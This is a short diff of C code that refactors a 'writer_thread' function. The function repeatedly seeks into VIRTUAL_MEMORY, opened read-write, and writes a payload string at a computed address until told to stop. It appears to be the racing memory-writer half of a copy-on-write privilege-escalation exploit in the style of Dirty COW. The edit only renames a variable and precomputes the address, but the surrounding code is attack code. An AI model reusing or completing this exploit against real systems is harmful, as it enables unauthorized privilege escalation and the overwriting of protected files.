@@ -51,13 +51,14 @@ typedef struct payload_info {
 void *writer_thread(void *arg) {
 	PayloadInfo *info = arg;
 	char *str = info->payload;
+	char *payload_addr = (char *) info->loc_in_mem + info->offset;
 
-	int fd = open(VIRTUAL_MEMORY, O_RDWR);
-	ERR_IF(fd < 0);
+	int mem_fd = open(VIRTUAL_MEMORY, O_RDWR);
+	ERR_IF(mem_fd < 0);
 
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
-		lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
-		write(fd, str, strlen(str));
+		lseek(mem_fd, (uintptr_t) payload_addr, SEEK_SET);
+		write(mem_fd, str, strlen(str));
 	}
 
 	return NULL;
